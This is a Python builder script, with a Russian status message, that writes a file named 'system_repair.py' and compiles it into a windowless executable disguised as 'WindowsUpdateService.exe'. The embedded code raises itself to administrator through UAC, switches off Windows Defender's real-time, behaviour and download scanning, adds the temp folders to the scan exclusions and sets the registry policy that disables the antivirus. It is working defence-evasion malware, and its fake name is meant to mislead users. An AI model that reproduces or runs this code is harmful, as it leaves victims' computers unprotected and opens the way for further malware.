import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_disabler():
    disabler_code = '''import os
import subprocess
import time
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def disable_defender():
    commands = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Add-MpPreference -ExclusionPath \\\"%TEMP%\\\"",
        "Add-MpPreference -ExclusionPath \\\"C:\\\\Windows\\\\Temp\\\"",
        "Set-MpPreference -PUAProtection disable",
        "reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v \\\"DisableAntiSpyware\\\" /t REG_DWORD /d 1 /f"
    ]
    
    for cmd in commands:
        try:
            if cmd.startswith("reg"):
                subprocess.run(cmd, shell=True, capture_output=True)
            else:
                subprocess.run(["powershell", "-Command", cmd], capture_output=True)
            time.sleep(0.5)
        except:
            pass

disable_defender()
'''

    with open('system_repair.py', 'w', encoding='utf-8') as f:
        f.write(disabler_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "WindowsUpdateService" system_repair.py')
    print("Скомпилировано как WindowsUpdateService.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_disabler()
    compile_to_exe()
